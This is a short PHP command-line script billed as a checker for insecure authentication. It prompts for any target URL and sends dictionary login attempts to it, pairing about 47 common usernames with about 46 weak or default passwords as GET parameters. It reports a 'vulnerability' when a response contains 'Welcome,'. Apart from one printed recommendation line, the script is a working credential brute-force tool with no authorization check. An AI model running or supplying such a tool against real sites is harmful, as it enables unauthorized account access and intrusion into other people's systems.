<?php
// Function to add color to text
function colorize($text, $color) {
    $colors = array(
        'red' => '0;31', 'green' => '0;32', 'yellow' => '1;33',
        'blue' => '0;34', 'magenta' => '0;35', 'cyan' => '0;36',
        'white' => '1;37', 'default' => '0'
    );
    return "\033[" . $colors[$color] . "m" . $text . "\033[0m";
}

// Function to test insecure authentication vulnerability
function testInsecureAuth($url, $usernames, $passwords) {
    foreach ($usernames as $username) {
        foreach ($passwords as $password) {
            // Send authentication request
            $response = file_get_contents($url . '?username=' . $username . '&password=' . $password);

            // Check if authentication was successful
            if (strpos($response, 'Welcome,') !== false) {
                echo colorize("[+] Vulnerability detected: Insecure Authentication\n", 'red');
                echo colorize("[+] Testing method: Passing credentials via URL parameters\n", 'yellow');
                echo colorize("[+] Recommendation: Implement secure authentication mechanisms such as HTTPS and session-based authentication.\n", 'green');
                return;
            }
        }
    }
    echo colorize("[*] No vulnerability detected.\n", 'green');
}

// Main program
echo colorize("Enter your target website URL: ", 'cyan');
$targetUrl = trim(fgets(STDIN));

// Usernames and passwords to test
$usernames = ['admin', 'user', 'root', 'superuser', 'test', 'developer', 'manager', 'guest', 'webmaster', 'owner', 'sysadmin', 'demo', 'support', 'sales', 'customer', 'info', 'john', 'jane', 'alex', 'mike', 'david', 'chris', 'anna', 'emma', 'olivia', 'sophia', 'jack', 'jackson', 'emily', 'charlotte', 'james', 'william', 'benjamin', 'lucas', 'thomas', 'daniel', 'matthew', 'ryan', 'noah', 'ethan', 'mason', 'aaron', 'samuel', 'nathan', 'liam', 'wyatt', 'henry'];
$passwords = ['password', '123456', 'admin123', 'qwerty', 'letmein', 'password123', '123456789', '12345678', '1234567', '12345', '1234', '123', 'password1', 'abc123', 'iloveyou', 'monkey', '123123', 'welcome', 'football', 'password123', '1234567890', '123456789a', '123456abc', 'password!', 'qwerty123', 'password123!', 'adminadmin', 'admin123!', 'admin!23', '123qwe', 'adminadmin123', 'passw0rd', 'admin@123', 'admin@123!', 'admin@1234', 'admin@1234!', 'admin@12345', 'admin@12345!', 'admin@123456', 'admin@123456!', 'admin@1234567', 'admin@1234567!', 'admin@12345678', 'admin@12345678!', 'admin@123456789', 'admin@123456789!'];

echo colorize("[*] Testing insecure authentication vulnerability for: $targetUrl\n", 'blue');
testInsecureAuth($targetUrl, $usernames, $passwords);
?>
